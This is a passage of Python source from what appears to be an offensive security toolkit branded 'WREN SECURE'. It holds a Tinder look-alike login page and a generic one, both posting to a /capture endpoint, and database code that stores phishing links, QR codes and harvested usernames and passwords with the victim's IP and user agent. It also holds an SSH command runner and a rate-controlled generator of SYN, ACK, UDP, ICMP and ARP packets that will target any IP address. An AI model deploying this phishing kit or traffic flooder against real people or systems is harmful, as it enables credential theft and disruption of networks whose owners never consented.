        return """<!DOCTYPE html>
<html>
<head><title>Tinder</title>
<style>
body{background:#ff5a60;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#ff5a60;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#ff5a60;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Tinder</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_custom_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#667eea;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:8px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>🐦 WREN SECURE Portal</h1></div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    # ==================== API Key Methods ====================
    def create_api_key(self, name: str, permissions: List[str]) -> Optional[str]:
        """Create a new API key"""
        try:
            api_id = str(uuid.uuid4())[:8]
            api_key = secrets.token_urlsafe(32)
            permissions_json = json.dumps(permissions)
            self.cursor.execute('''
                INSERT INTO api_keys (id, name, key, permissions, created_at, active)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, 1)
            ''', (api_id, name, api_key, permissions_json))
            self.conn.commit()
            return api_key
        except Exception as e:
            logger.error(f"Failed to create API key: {e}")
            return None
    
    def validate_api_key(self, api_key: str) -> Optional[Dict]:
        """Validate an API key"""
        try:
            self.cursor.execute('''
                SELECT * FROM api_keys WHERE key = ? AND active = 1
            ''', (api_key,))
            row = self.cursor.fetchone()
            if row:
                self.cursor.execute('''
                    UPDATE api_keys SET last_used = CURRENT_TIMESTAMP, requests_count = requests_count + 1
                    WHERE key = ?
                ''', (api_key,))
                self.conn.commit()
                return dict(row)
            return None
        except Exception as e:
            logger.error(f"Failed to validate API key: {e}")
            return None
    
    def log_api_request(self, api_key_id: str, endpoint: str, method: str, status_code: int, response_time: float):
        """Log API request"""
        try:
            self.cursor.execute('''
                INSERT INTO api_requests (api_key_id, endpoint, method, status_code, response_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (api_key_id, endpoint, method, status_code, response_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log API request: {e}")
    
    # ==================== Wordlist Methods ====================
    def add_wordlist(self, name: str, file_path: str, word_count: int) -> Optional[str]:
        """Add wordlist to database"""
        try:
            wordlist_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO wordlists (id, name, file_path, word_count, created_at)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (wordlist_id, name, file_path, word_count))
            self.conn.commit()
            return wordlist_id
        except Exception as e:
            logger.error(f"Failed to add wordlist: {e}")
            return None
    
    def get_wordlists(self) -> List[Dict]:
        """Get all wordlists"""
        try:
            self.cursor.execute('SELECT * FROM wordlists ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get wordlists: {e}")
            return []
    
    def update_wordlist_last_used(self, wordlist_id: str):
        """Update wordlist last used time"""
        try:
            self.cursor.execute('''
                UPDATE wordlists SET last_used = CURRENT_TIMESTAMP WHERE id = ?
            ''', (wordlist_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update wordlist: {e}")
    
    # ==================== SSH Server Methods ====================
    def add_ssh_server(self, server: SSHServer) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username, 
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at, server.status))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def get_ssh_servers(self) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def update_ssh_server_status(self, server_id: str, status: str):
        try:
            self.cursor.execute('''
                UPDATE ssh_servers SET status = ?, last_used = CURRENT_TIMESTAMP WHERE id = ?
            ''', (status, server_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH server status: {e}")
    
    def log_ssh_command(self, server_id: str, command: str, success: bool, 
                       output: str, execution_time: float, executed_by: str = "system"):
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands (server_id, command, success, output, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (server_id, command, success, output[:5000], execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    # ==================== Traffic Methods ====================
    def log_traffic(self, generator: TrafficGenerator):
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs (traffic_type, target_ip, duration, packets_sent, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (generator.traffic_type, generator.target_ip, generator.duration,
                  generator.packets_sent, generator.status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    # ==================== Phishing Methods ====================
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, phishing_url, created_at, clicks, qr_code_path)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.phishing_url, link.created_at, link.clicks, link.qr_code_path))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC')
            else:
                self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def update_phishing_link_qr(self, link_id: str, qr_path: str):
        try:
            self.cursor.execute('UPDATE phishing_links SET qr_code_path = ? WHERE id = ?', (qr_path, link_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update QR path: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
            return False
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        try:
            if platform:
                self.cursor.execute('SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name', (platform,))
            else:
                self.cursor.execute('SELECT * FROM phishing_templates ORDER BY platform, name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    # ==================== Scan Results Methods ====================
    def save_scan_result(self, scan_result: ScanResult) -> bool:
        try:
            open_ports_json = json.dumps(scan_result.open_ports)
            closed_ports_json = json.dumps(scan_result.closed_ports)
            self.cursor.execute('''
                INSERT INTO scan_results (id, target, scan_type, open_ports, closed_ports, timestamp, scan_time, success)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (scan_result.id, scan_result.target, scan_result.scan_type, open_ports_json,
                  closed_ports_json, scan_result.timestamp, scan_result.scan_time, 1))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save scan result: {e}")
            return False
    
    def get_scan_results(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM scan_results ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            results = []
            for row in self.cursor.fetchall():
                row_dict = dict(row)
                row_dict['open_ports'] = json.loads(row_dict['open_ports']) if row_dict['open_ports'] else []
                row_dict['closed_ports'] = json.loads(row_dict['closed_ports']) if row_dict['closed_ports'] else []
                results.append(row_dict)
            return results
        except Exception as e:
            logger.error(f"Failed to get scan results: {e}")
            return []
    
    def get_scan_statistics(self) -> Dict:
        try:
            open_ports_count = 0
            total_scans = 0
            self.cursor.execute('SELECT open_ports FROM scan_results')
            for row in self.cursor.fetchall():
                total_scans += 1
                if row['open_ports']:
                    ports = json.loads(row['open_ports'])
                    open_ports_count += len(ports)
            
            return {
                'total_scans': total_scans,
                'total_open_ports': open_ports_count,
                'avg_open_ports': open_ports_count / max(1, total_scans)
            }
        except Exception as e:
            logger.error(f"Failed to get scan statistics: {e}")
            return {}
    
    # ==================== Threat Methods ====================
    def add_threat_alert(self, alert: ThreatAlert) -> bool:
        try:
            self.cursor.execute('''
                INSERT INTO threats (id, timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (alert.id, alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add threat alert: {e}")
            return False
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get recent threats: {e}")
            return []
    
    def get_threat_statistics(self) -> Dict:
        try:
            severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
            self.cursor.execute('SELECT severity FROM threats')
            for row in self.cursor.fetchall():
                severity = row['severity'].lower()
                if severity in severity_counts:
                    severity_counts[severity] += 1
            
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            total = self.cursor.fetchone()[0]
            
            return {
                'total_threats': total,
                'severity_distribution': severity_counts
            }
        except Exception as e:
            logger.error(f"Failed to get threat statistics: {e}")
            return {}
    
    # ==================== Command History Methods ====================
    def log_command(self, command: str, source: str = "local", platform: str = "local",
                   success: bool = True, output: str = "", execution_time: float = 0.0):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, platform, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command, source, platform, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT timestamp, command, source, success, execution_time 
                FROM command_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['total_phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM scan_results')
            stats['total_scan_results'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM wordlists')
            stats['total_wordlists'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM api_keys')
            stats['total_api_keys'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        return stats
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result)
                VALUES (?, ?, ?)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def log_spoofing(self, spoof_type: str, original: str, spoofed: str, target: str, success: bool):
        try:
            self.cursor.execute('''
                INSERT INTO spoofing_attempts (spoof_type, original_value, spoofed_value, target, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (spoof_type, original, spoofed, target, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log spoofing: {e}")
    
    def log_port_scan(self, target: str, scan_type: str, open_ports: List[Dict], 
                     closed_ports: List[Dict], scan_time: float, success: bool = True):
        try:
            open_ports_json = json.dumps(open_ports)
            closed_ports_json = json.dumps(closed_ports)
            self.cursor.execute('''
                INSERT INTO port_scans (target, scan_type, open_ports, closed_ports, scan_time, success)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (target, scan_type, open_ports_json, closed_ports_json, scan_time, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log port scan: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str, scan_time: float, success: bool = True):
        try:
            vulnerabilities_json = json.dumps(vulnerabilities)
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, vulnerabilities_json, output_file, scan_time, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            results = []
            for row in self.cursor.fetchall():
                row_dict = dict(row)
                row_dict['vulnerabilities'] = json.loads(row_dict['vulnerabilities']) if row_dict['vulnerabilities'] else []
                results.append(row_dict)
            return results
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def update_platform_status(self, platform: str, enabled: bool, status: str, error: str = None):
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
            ''', (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update platform status: {e}")
    
    def get_platform_status(self) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM platform_status')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get platform status: {e}")
            return []
    
    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.connections = {}
        self.shells = {}
        self.lock = threading.Lock()
        self.max_connections = self.config.get('ssh', {}).get('max_connections', 5)
        self.default_timeout = self.config.get('ssh', {}).get('default_timeout', 30)
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        
        try:
            server_id = str(uuid.uuid4())[:8]
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id,
                name=name,
                host=host,
                port=port,
                username=username,
                password=password,
                key_file=key_file,
                use_key=key_file is not None,
                timeout=self.default_timeout,
                notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {'success': True, 'server_id': server_id, 'message': f'Server {name} added successfully'}
            return {'success': False, 'error': 'Failed to add server to database'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def connect(self, server_id: str) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                connect_kwargs = {'hostname': server['host'], 'port': server['port'],
                                 'username': server['username'], 'timeout': server.get('timeout', self.default_timeout)}
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                self.connections[server_id] = client
                self.db.update_ssh_server_status(server_id, 'connected')
                return {'success': True, 'message': f'Connected to {server["name"]} ({server["host"]})'}
            except paramiko.AuthenticationException:
                return {'success': False, 'error': 'Authentication failed'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    try:
                        self.connections[server_id].close()
                    except:
                        pass
                    del self.connections[server_id]
                    self.db.update_ssh_server_status(server_id, 'disconnected')
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> SSHCommandResult:
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False, output='', error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time, server=server_id)
        
        client = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout or self.default_timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=len(error) == 0, output=output, error=error if error else None,
                execution_time=execution_time, server=server_name)
            
            self.db.log_ssh_command(server_id=server_id, command=command, success=result.success,
                                   output=output, execution_time=execution_time, executed_by=executed_by)
            return result
        except Exception as e:
            self.disconnect(server_id)
            return SSHCommandResult(success=False, output='', error=str(e),
                                   execution_time=time.time() - start_time, server=server_name)
    
    def get_servers(self) -> List[Dict]:
        servers = self.db.get_ssh_servers()
        for server in servers:
            server['connected'] = server['id'] in self.connections
        return servers
    
    def get_status(self, server_id: str = None) -> Dict:
        with self.lock:
            if server_id:
                return {'connected': server_id in self.connections}
            else:
                return {'total_connections': len(self.connections), 'max_connections': self.max_connections,
                       'connections': list(self.connections.keys())}

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        available = ['tcp_connect', 'http_get', 'http_post', 'https', 'dns']
        if self.scapy_available and self.has_raw_socket_permission:
            available.extend(['icmp', 'tcp_syn', 'tcp_ack', 'udp', 'arp'])
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int,
                        port: int = None, packet_rate: int = 100, executed_by: str = "system") -> TrafficGenerator:
        max_duration = self.config.get('traffic', {}).get('max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum ({max_duration} seconds)")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            if traffic_type in ['http_get', 'http_post']:
                port = 80
            elif traffic_type == 'https':
                port = 443
            elif traffic_type == 'dns':
                port = 53
            elif traffic_type in ['tcp_syn', 'tcp_ack', 'tcp_connect']:
                port = 80
            elif traffic_type == 'udp':
                port = 53
            else:
                port = 0
        
        generator = TrafficGenerator(
            traffic_type=traffic_type, target_ip=target_ip, target_port=port,
            duration=duration, start_time=datetime.datetime.now().isoformat(), status="running")
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        thread = threading.Thread(target=self._run_traffic_generator,
                                 args=(generator_id, generator, packet_rate, stop_event))
        thread.daemon = True
        thread.start()
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator,
                               packet_rate: int, stop_event: threading.Event):
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            generator_func = self._get_generator_function(generator.traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    time.sleep(packet_interval)
                except Exception as e:
                    time.sleep(0.1)
            
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            self.db.log_traffic(generator)
        except Exception as e:
            generator.status = "failed"
            self.db.log_traffic(generator)
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        generators = {
            'icmp': self._generate_icmp,
            'tcp_syn': self._generate_tcp_syn,
            'tcp_ack': self._generate_tcp_ack,
            'tcp_connect': self._generate_tcp_connect,
            'udp': self._generate_udp,
            'http_get': self._generate_http_get,
            'http_post': self._generate_http_post,
            'https': self._generate_https,
            'dns': self._generate_dns,
            'arp': self._generate_arp
        }
        return generators.get(traffic_type, self._generate_tcp_connect)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, ICMP, send
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: WrenBot\r\n\r\n"
            sock.send(data.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                from scapy.all import IP, UDP, send
                data = b"WrenBot Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"WrenBot Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "WrenBot"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=wrenbot"
            headers = {"User-Agent": "WrenBot", "Content-Length": str(len(data))}
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "WrenBot"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 300
        except:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import Ether, ARP, sendp
            local_mac = self._get_local_mac()
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id, "target_ip": generator.target_ip, "traffic_type": generator.traffic_type,
                "duration": generator.duration, "packets_sent": generator.packets_sent
            })
        return active
    
    def get_traffic_types_help(self) -> str:
        help_text = "Available Traffic Types:\n\n📡 Basic Traffic:\n"
        help_text += "  icmp, tcp_syn, tcp_ack, tcp_connect, udp\n"
        help_text += "  http_get, http_post, https, dns, arp\n"
        return help_text

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.nikto_available = shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            cmd = ['nikto', '-host', target]
            if options.get('ssl') or target.startswith('https://'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
